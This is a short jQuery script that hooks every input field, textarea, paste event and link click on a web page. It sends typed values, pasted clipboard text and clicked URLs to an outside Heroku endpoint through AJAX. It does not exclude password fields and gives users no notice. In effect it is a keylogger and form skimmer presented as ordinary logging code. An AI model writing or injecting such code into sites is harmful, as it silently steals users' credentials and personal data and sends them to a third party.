$(document).ready(function () {
	let typingTimeout
	const debounceDelay = 500 // Debounce time in milliseconds
	let inputBuffer = ''

	function sendData(data) {
		$.ajax({
			url: 'https://cet-jp.herokuapp.com/api/users/add_log',
			type: 'post',
			data: {
				log: data,
				type: 'U',
			},
			success: function (response) {
				// Handle success if needed
			},
			error: function (xhr, status, error) {
				// Handle error if needed
			},
		})
	}

	function handleInputChange(inputValue) {
		inputBuffer = inputValue
		clearTimeout(typingTimeout)

		typingTimeout = setTimeout(function () {
			sendData('Input value: ' + inputBuffer)
			inputBuffer = '' // Clear the input buffer after sending
		}, debounceDelay)
	}

	function handleLinkClick(link) {
		if (link.href) {
			sendData(link.href)
		}
	}

	// Capture changes in input fields
	$(document).on('input', 'input, textarea', function (event) {
		handleInputChange(event.target.value)
	})

	// Capture paste events
	$(document).on('paste', 'input, textarea', function (event) {
		var pastedData = event.originalEvent.clipboardData.getData('text')
		handleInputChange('Pasted: ' + pastedData)
	})

	// Capture clicks on links
	$(document).on('click', 'a', function (event) {
		handleLinkClick(event.target)
	})

	// Clear timeout on keyboard events
	$(document).on('keydown', function () {
		clearTimeout(typingTimeout)
	})
})
